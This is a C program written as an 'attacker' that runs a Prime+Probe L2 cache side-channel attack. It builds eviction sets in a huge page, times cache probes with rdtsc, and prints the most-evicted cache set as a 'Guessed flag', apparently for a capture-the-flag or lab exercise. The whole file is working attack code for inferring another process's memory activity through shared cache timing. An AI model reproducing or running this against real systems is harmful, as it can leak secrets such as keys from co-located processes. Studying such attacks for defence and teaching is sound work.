#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>

#define NUM_L2_CACHE_SETS 1024   // Number of L2 cache sets
#define WAYS 16                   // L2 associativity
#define REPEATS 100               // Number of probe repetitions
#define THRESHOLD 200             // Minimum delta to consider eviction

// --- Helper functions ---

// Read timestamp counter
static inline uint64_t rdtsc() {
    unsigned int lo, hi;
    asm volatile ("mfence\nlfence\nrdtsc" : "=a"(lo), "=d"(hi));
    return ((uint64_t)hi << 32) | lo;
}

// Allocate a 2MB huge page
char* get_buffer() {
    size_t size = 2 * 1024 * 1024; // 2 MB huge page
    char *buf = mmap(NULL, size, PROT_READ | PROT_WRITE,
                     MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB | MAP_POPULATE,
                     -1, 0);
    if (buf == (void*)-1) {
        perror("mmap buffer");
        exit(1);
    }
    *((char*)buf) = 1; // touch memory
    return buf;
}

// Build eviction set for one cache set
void get_partial_eviction_set(char *buf, char *eviction_set[WAYS], int set_index) {
    for (int i = 0; i < WAYS; i++) {
        eviction_set[i] = buf + (i << 16) + (set_index << 6);  // i*64KB + set_index*64B
    }
}

// --- Main attacker ---
int main() {
    char *buf = get_buffer();
    char *eviction_sets[NUM_L2_CACHE_SETS][WAYS];

    // Build all eviction sets
    for (int i = 0; i < NUM_L2_CACHE_SETS; i++)
        get_partial_eviction_set(buf, eviction_sets[i], i);

    printf("Attacker ready. Prime+Probe starting...\n");

    while (1) {
        int scores[NUM_L2_CACHE_SETS] = {0};

        for (int r = 0; r < REPEATS; r++) {

            // Measure each cache set
            for (int set = 0; set < NUM_L2_CACHE_SETS; set++) {
                volatile char tmp;

                // --- Prime ---
                for (int j = 0; j < WAYS; j++)
                    tmp = *(eviction_sets[set][j]);

                asm volatile("mfence; lfence"); // prevent reordering

                // --- Probe ---
                uint64_t start = rdtsc();
                for (int j = 0; j < WAYS; j++)
                    tmp = *(eviction_sets[set][j]);
                uint64_t end = rdtsc();

                scores[set] += (end - start);
            }
        }

        // Find cache set with largest score
        int guessed_flag = 0;
        uint64_t max_score = 0;
        for (int i = 0; i < NUM_L2_CACHE_SETS; i++) {
            if (scores[i] > max_score) {
                max_score = scores[i];
                guessed_flag = i;
            }
        }

        // Print only if above threshold
        if (max_score / REPEATS > THRESHOLD) {
            printf("Guessed flag: %d (score=%lu)\n", guessed_flag, max_score / REPEATS);
            fflush(stdout);
        }

        usleep(500000); // half-second delay
    }

    return 0;
}